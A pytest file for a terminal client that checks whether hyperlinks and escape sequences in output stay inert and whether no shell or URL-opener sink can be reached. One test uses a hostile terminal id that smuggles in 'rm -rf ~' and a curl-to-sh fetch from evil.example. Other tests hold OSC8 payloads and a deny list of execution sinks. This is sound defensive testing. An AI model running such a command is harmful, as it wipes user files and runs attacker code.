"""Hyperlinks in output never auto-open or execute.

OSC8 sequences and bare URLs flow through the real client intake and
their projection text is inert (targets consumed, never actionable).
Beyond the projection text, inertness is structural: no URL opener,
host command, or subprocess is referenced from the output-reachable
features at all. The only URL opener in the client
(AuthService.open_url) fires solely for the self-built gateway
authorize URL at explicit login; the only subprocess argv (connector
attach) is a fixed herdr argv with the terminal id as one element.
"""

from __future__ import annotations

import asyncio
from pathlib import Path

from relaydeck.client.features.terminal.projection import TerminalProjection
from relaydeck.client.features.terminal.stream import TerminalByteStream
from relaydeck.gateway import terminal_wire

OSC8_LINK = b"\x1b]8;;https://evil.example/pwn\x1b\\click me\x1b]8;;\x1b\\"
OSC8_BEL = b"\x1b]8;;https://evil.example/x\x07label\x1b]8;;\x07"
BARE_URLS = b"see https://evil.example/pwn and http://10.0.0.9:8080/x?c=1\r\n"


def _intake(data: bytes) -> TerminalProjection:
    stream = TerminalByteStream()
    projection = TerminalProjection()
    event = stream.push(terminal_wire.OutputChunk("e1", 0, data))
    assert event.kind == "data"
    projection.feed(event.data)
    projection.flush()
    return projection


def test_osc8_renders_inert() -> None:
    projection = _intake(b"before " + OSC8_LINK + b" after")
    text = "\n".join(projection.lines)
    assert "click me" in text  # visible label stays
    assert "https://evil.example/pwn" not in text  # target consumed, never actionable


def test_osc8_bel_form_renders_inert() -> None:
    projection = _intake(OSC8_BEL)
    text = "\n".join(projection.lines)
    assert "label" in text
    assert "evil.example" not in text


def test_bare_urls_are_plain_text() -> None:
    projection = _intake(BARE_URLS)
    text = "\n".join(projection.lines)
    assert "https://evil.example/pwn" in text  # shown, not acted on
    # No opener exists on the intake path (structural: next test pins it).


def test_no_url_or_command_sink_reachable_from_output() -> None:
    """The output-intake and terminal/composer/shell features reference
    no URL opener, shell, or dynamic-code sink at all."""
    root = Path(__file__).resolve().parent.parent.parent / "src" / "relaydeck"
    haystacks: list[str] = []
    for rel in (
        "client/features/terminal",
        "client/features/composer",
        "client/features/shell",
        "client/features/inventory",
    ):
        for path in sorted((root / rel).glob("*.py")):
            haystacks.append(path.read_text())
    hay = "\n".join(haystacks)
    for sink in (
        "webbrowser",
        "launch_url",
        "launchUrl",
        "open_url",
        "openUrl",
        "url_launcher",
        "subprocess",
        "os.system",
        "os.popen",
        "os.exec",
        "os.spawn",
        "eval(",
        "exec(",
        "__import__",
        "compile(",
    ):
        assert sink not in hay, f"output-reachable sink? {sink}"


def test_auth_opener_fires_only_for_self_built_authorize_url() -> None:
    """open_url is called exactly once per explicit begin_login, with a
    URL built from trusted config -- never with output-derived text."""
    from relaydeck.client.adapters.fake import FakeCredentialStore
    from relaydeck.client.features.auth.service import AuthService, GatewayConfig

    opened: list[str] = []

    async def opener(url: str) -> None:
        opened.append(url)

    async def scenario() -> None:
        service = AuthService(
            config=GatewayConfig(base_url="https://gw.example"),
            credentials=FakeCredentialStore(),
            post_json=_unreachable_post,
            open_url=opener,
        )
        url = await service.begin_login()
        assert opened == [url]
        assert url.startswith("https://gw.example/v1/authorize?")
        assert "evil.example" not in url

    asyncio.run(scenario())


async def _unreachable_post(*args: object, **kwargs: object) -> object:
    raise AssertionError(f"no HTTP expected here: {args} {kwargs}")


def test_attach_argv_never_shells_ids() -> None:
    """Terminal ids with shell metacharacters stay one argv element; no
    shell is ever involved in attach."""
    from relaydeck.connector.attach import attach_argv

    evil = "term-1; rm -rf ~ # $(curl evil.example|sh)"
    argv = attach_argv("herdr", terminal_id=evil)
    assert argv == ["herdr", "terminal", "attach", evil]
    argv = attach_argv("herdr", target=evil, takeover=True)
    assert argv == ["herdr", "agent", "attach", evil, "--takeover"]


def test_display_emulator_disables_url_opening() -> None:
    """xterm2 opens URLs only through TerminalView.onHyperlinkTap (and
    raises output notifications through Terminal.onNotification); the
    bridge leaves both unset. Static pin (no Flutter toolchain here):
    the Dart source states the denial and never assigns the handlers."""
    dart = (
        Path(__file__).resolve().parent.parent.parent
        / "extensions"
        / "terminal"
        / "src"
        / "flutter"
        / "relaydeck_terminal"
        / "lib"
        / "src"
        / "relaydeck_terminal.dart"
    )
    source = dart.read_text()
    assert "onHyperlinkTap" in source  # the denial names the exact hook
    assert source.count("onHyperlinkTap =") == 0
    assert source.count("onHyperlinkTap:") == 0
    assert "onNotification" in source
    assert source.count("onNotification =") == 0
    assert source.count("onNotification:") == 0
    assert source.count("onOpenUrl =") == 0
    assert source.count("onOpenUrl:") == 0
